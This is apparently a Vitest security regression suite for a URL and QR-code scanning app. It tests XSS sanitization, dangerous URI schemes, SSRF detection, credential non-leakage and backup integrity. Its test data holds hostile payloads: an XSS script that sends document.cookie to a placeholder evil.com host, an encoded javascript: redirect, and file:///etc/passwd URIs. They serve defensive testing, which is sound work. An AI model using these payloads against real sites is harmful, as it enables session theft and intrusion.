import { describe, it, expect, beforeEach, vi } from "vitest";
import { sanitizeInput, validateWebUrl } from "@/lib/scan/security";
import { analyzeUrlSafety } from "@/lib/url-safety";
import { parseScanContent } from "@/lib/scan/parser";
import { investigationEngine } from "@/lib/investigation";
import { parseIpv4Notation, normalizeAndAnalyzeUrl } from "@/lib/investigation/url-normalizer";
import { BackupManager } from "@/lib/backup/backup-manager";
import { useSettings } from "@/lib/settings";
import type { ScanRecord } from "@/lib/scan/types";

describe("Phase 18: Security & OWASP Regression Suite", () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  describe("1. XSS & Dangerous Payload Sanitization", () => {
    it("neutralizes script tags, onerror handlers, and HTML tags in user/scanner input", () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "Hello <script>document.location='http://evil.com/'+document.cookie</script>",
      ];

      for (const payload of xssPayloads) {
        const sanitized = sanitizeInput(payload);
        expect(sanitized).not.toContain("<script>");
        expect(sanitized).not.toContain("<img");
        expect(sanitized).not.toContain("<svg");
        expect(sanitized).not.toContain("<iframe");
        expect(sanitized).toMatch(/&lt;|&gt;/);
      }
    });

    it("strips ASCII and Unicode control characters while preserving valid content", () => {
      const payloadWithNullBytes = "https://example.com/login\x00\x08\x1F\x7F";
      const sanitized = sanitizeInput(payloadWithNullBytes);
      expect(sanitized).toBe("https://example.com/login");
    });
  });

  describe("2. Dangerous & Executable URI Schemes Neutralization", () => {
    it("flags executable and dangerous URI schemes as malicious in analyzeUrlSafety", () => {
      const dangerousSchemes = [
        "javascript:alert(document.domain)",
        "javascript://%0Aalert(1)",
        "vbscript:msgbox(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "file:///etc/passwd",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "blob:https://evil.com/a5e8f498-89c0-42ab",
        "intent://scan/#Intent;scheme=malicious;package=com.evil;end",
        "shell:cmd.exe",
        "about:blank",
      ];

      for (const scheme of dangerousSchemes) {
        const safety = analyzeUrlSafety(scheme);
        expect(safety.level).toBe("malicious");
        expect(safety.reasons.some((r) => r.toLowerCase().includes("dangerous") || r.toLowerCase().includes("protocol"))).toBe(true);

        const isValidWeb = validateWebUrl(scheme);
        expect(isValidWeb).toBe(false);
      }
    });

    it("evaluates dangerous scheme payloads into high/critical threat findings in investigation engine", async () => {
      const maliciousPayload = "javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbSI='))";
      const parsed = parseScanContent(maliciousPayload, "UNKNOWN");
      const scan: ScanRecord = {
        id: "scan-xss-test",
        content: maliciousPayload,
        format: "UNKNOWN",
        type: parsed.type,
        parsed: parsed.data,
        safetyStatus: "unchecked",
        scannedAt: Date.now(),
      };

      const { report, findings } = await investigationEngine.runInvestigation(scan, "case-sec-xss");
      expect(report.finalRisk.overall).toMatch(/malicious|critical|high|suspicious/);
      expect(findings.some((f) => f.finding.toLowerCase().includes("javascript") || f.finding.toLowerCase().includes("dangerous"))).toBe(true);
    });
  });

  describe("3. SSRF & Intranet Containment", () => {
    it("identifies private RFC 1918 networks and loopbacks in URL normalizer", () => {
      const loopbackResult = parseIpv4Notation("127.0.0.1");
      expect(loopbackResult.isIp).toBe(true);
      expect(loopbackResult.isLoopback).toBe(true);

      const privateResult1 = parseIpv4Notation("10.0.0.1");
      expect(privateResult1.isIp).toBe(true);
      expect(privateResult1.isPrivate).toBe(true);

      const privateResult2 = parseIpv4Notation("192.168.1.1");
      expect(privateResult2.isIp).toBe(true);
      expect(privateResult2.isPrivate).toBe(true);

      const privateTargets = [
        "http://127.0.0.1:8080/admin",
        "http://localhost:3000/metrics",
        "http://10.0.0.1/router-config",
        "http://172.16.0.5/api/internal",
        "http://192.168.1.1/gateway",
      ];

      for (const target of privateTargets) {
        const { result } = normalizeAndAnalyzeUrl(target);
        expect(result.normalized).toBeDefined();
        expect(result.isValid).toBe(true);
        const safety = analyzeUrlSafety(target);
        expect(safety.reasons.length).toBeGreaterThan(0);
      }
    });
  });

  describe("4. Secret & BYOK Credential Isolation", () => {
    it("never exposes BYOK credentials or sensitive tokens in investigation reports or exports", async () => {
      // Simulate configured BYOK keys in user settings
      useSettings.setState({
        apiKeys: {
          "virus-total": "SUPER_SECRET_VT_KEY_9999",
          "urlscan": "SUPER_SECRET_URLSCAN_KEY_8888",
          "abuseipdb": "SUPER_SECRET_ABUSEIPDB_KEY_7777",
          "safebrowsing": "SUPER_SECRET_GSB_KEY_6666",
        },
      });

      const scan: ScanRecord = {
        id: "scan-secret-test",
        content: "https://suspicious-test-artifact.org",
        type: "url",
        format: "QR_CODE",
        scannedAt: Date.now(),
      };

      const { report, findings } = await investigationEngine.runInvestigation(scan, "case-sec-creds");
      const serializedReport = JSON.stringify(report);
      const serializedFindings = JSON.stringify(findings);

      // Verify no secrets leaked in report or findings JSON
      expect(serializedReport).not.toContain("SUPER_SECRET_VT_KEY_9999");
      expect(serializedReport).not.toContain("SUPER_SECRET_URLSCAN_KEY_8888");
      expect(serializedReport).not.toContain("SUPER_SECRET_ABUSEIPDB_KEY_7777");
      expect(serializedReport).not.toContain("SUPER_SECRET_GSB_KEY_6666");

      expect(serializedFindings).not.toContain("SUPER_SECRET_VT_KEY_9999");
      expect(serializedFindings).not.toContain("SUPER_SECRET_URLSCAN_KEY_8888");
    });
  });

  describe("5. Ingestion Bounds & ReDoS Safety", () => {
    it("safely enforces upper length limits to prevent denial-of-service", () => {
      const hugeInput = "https://example.com/" + "a".repeat(10000);
      const sanitized = sanitizeInput(hugeInput, 2048);
      expect(sanitized.length).toBeLessThanOrEqual(2048);
    });

    it("parses complex homoglyphs and punycode without catastrophic regex stalling", () => {
      const punycodeUrl = "https://xn--e1afmkfd.xn--80akhbyknj4f/login"; // Cyrillic homoglyph
      const safety = analyzeUrlSafety(punycodeUrl);
      expect(safety.reasons.some((r) => r.toLowerCase().includes("encoded") || r.toLowerCase().includes("characters"))).toBe(true);
    });
  });

  describe("6. Storage & Import Integrity Validation", () => {
    it("flags checksum mismatch warning on altered backup payload in BackupManager", async () => {
      const tamperedBackupJson = JSON.stringify({
        manifest: {
          format: "scaniq-backup-bundle",
          version: 1,
          appVersion: "1.0.0",
          exportTimestamp: new Date().toISOString(),
          casesCount: 0,
          scansCount: 0,
          investigationsCount: 0,
          checksumSha256: "0000000000000000000000000000000000000000000000000000000000000000",
        },
        data: {
          cases: [],
          scans: [],
          investigations: [],
          settings: {},
        },
      });

      const validation = await BackupManager.validateBackup(tamperedBackupJson);
      expect(validation.warnings.some((w) => w.toLowerCase().includes("checksum mismatch"))).toBe(true);
    });

    it("rejects completely invalid JSON or malformed structures", async () => {
      const invalidJson = "{ malformed json ::: invalid";
      const validation = await BackupManager.validateBackup(invalidJson);
      expect(validation.isValid).toBe(false);
      expect(validation.error).toBeDefined();

      const invalidBundle = JSON.stringify({ format: "unrecognized" });
      const invalidBundleValidation = await BackupManager.validateBackup(invalidBundle);
      expect(invalidBundleValidation.isValid).toBe(false);
    });
  });
});
